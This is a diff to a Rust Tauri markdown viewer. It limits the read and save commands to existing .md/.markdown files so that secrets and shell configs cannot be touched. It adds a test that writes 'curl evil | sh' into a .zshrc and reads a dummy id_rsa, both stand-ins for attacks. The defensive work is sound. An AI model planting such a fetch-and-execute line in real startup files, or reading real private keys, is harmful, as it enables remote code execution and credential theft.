@@ -156,6 +156,7 @@ fn sanitize_markdown_html(html: &str) -> String {
 }
 
 const MAX_MARKDOWN_SIZE: u64 = 50 * 1024 * 1024; // 50 MB
+const MARKDOWN_EXTENSIONS: &[&str] = &["md", "markdown"];
 
 /// UTF-8 ならそのまま (BOM も保つ)、それ以外は文字コードを推定してデコードする。
 fn decode_markdown(bytes: Vec<u8>) -> (String, String) {
@@ -184,6 +185,7 @@ fn encode_markdown(content: &str, encoding: Option<&str>) -> Result<Vec<u8>, Str
 #[tauri::command(async)]
 pub fn read_markdown(path: String) -> Result<MarkdownResult, String> {
     crate::utils::catch_panic(move || {
+        crate::utils::require_extension(std::path::Path::new(&path), MARKDOWN_EXTENSIONS)?;
         let size = crate::utils::assert_regular_file(std::path::Path::new(&path))?;
         if size > MAX_MARKDOWN_SIZE {
             return Err(format!("Markdown file too large: {} bytes (max 50 MB)", size));
@@ -197,6 +199,10 @@ pub fn read_markdown(path: String) -> Result<MarkdownResult, String> {
 
 #[tauri::command(async)]
 pub fn save_markdown(path: String, content: String, encoding: Option<String>) -> Result<(), String> {
+    // 開いている既存の Markdown ファイルの上書きだけを許す (~/.zshrc などへの書き込みを防ぐ)
+    let p = std::path::Path::new(&path);
+    crate::utils::require_extension(p, MARKDOWN_EXTENSIONS)?;
+    crate::utils::assert_regular_file(p)?;
     let bytes = encode_markdown(&content, encoding.as_deref())?;
     crate::utils::atomic_write(std::path::Path::new(&path), &bytes).map_err(|e| e.to_string())
 }
@@ -270,6 +276,26 @@ mod tests {
         let unrepresentable = save_markdown(p, "絵文字 😀".into(), Some(read.encoding));
         std::fs::remove_file(&path).ok();
         assert!(unrepresentable.is_err());
+    }
+
+    #[test]
+    fn markdown_commands_only_touch_existing_markdown_files() {
+        let dir = std::env::temp_dir().join(format!("qv_mdguard_{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let secret = dir.join("id_rsa");
+        std::fs::write(&secret, "PRIVATE KEY").unwrap();
+        let p = |name: &str| dir.join(name).to_string_lossy().into_owned();
+
+        let read_secret = read_markdown(p("id_rsa"));
+        let write_rc = save_markdown(p(".zshrc"), "curl evil | sh".into(), None);
+        let create_md = save_markdown(p("new.md"), "x".into(), None);
+        let rc_exists = dir.join(".zshrc").exists() || dir.join("new.md").exists();
+        std::fs::remove_dir_all(&dir).ok();
+
+        assert!(read_secret.is_err());
+        assert!(write_rc.is_err());
+        assert!(create_md.is_err());
+        assert!(!rc_exists);
     }
 
     #[test]
@@ -479,6 +505,7 @@ mod tests {
         let path_str = path.to_string_lossy().to_string();
         let content = "---\ntitle: Test\nauthor: Alice\n---\n# Hello\n\nBody text.";
 
+        std::fs::write(&path, "").unwrap();
         save_markdown(path_str.clone(), content.to_string(), None).unwrap();
         let result = read_markdown(path_str).unwrap();
 
